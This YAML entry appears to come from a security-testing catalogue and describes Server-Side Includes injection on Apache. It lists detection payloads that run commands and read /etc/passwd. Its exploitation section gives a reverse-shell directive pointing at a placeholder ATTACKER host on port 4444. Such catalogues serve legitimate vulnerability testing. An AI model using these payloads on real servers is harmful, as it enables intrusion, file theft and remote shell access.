id: SSI
name: Server-Side Includes Injection
cwe:
- CWE-97
owasp: A03:2021 Injection
severity_range: High
description: SSI directives in user input are executed by web server (Apache mod_include).
detection:
  payloads:
  - <!--#exec cmd="id" -->
  - <!--#exec cmd="cat /etc/passwd" -->
  - <!--#include virtual="/etc/passwd" -->
  - <!--#include file="/etc/passwd" -->
  - <!--#echo var="DOCUMENT_ROOT" -->
  - <!--#flastmod virtual="/etc/passwd" -->
  indicators:
  - .shtml extensions on the site
  - Apache mod_include enabled
  - Pages with Options +Includes in .htaccess
exploitation:
  rce: <!--#exec cmd="bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'" -->
  file_read: <!--#include virtual="/etc/passwd" -->
  info_disclosure: <!--#echo var="DOCUMENT_ROOT" -->
references:
- https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
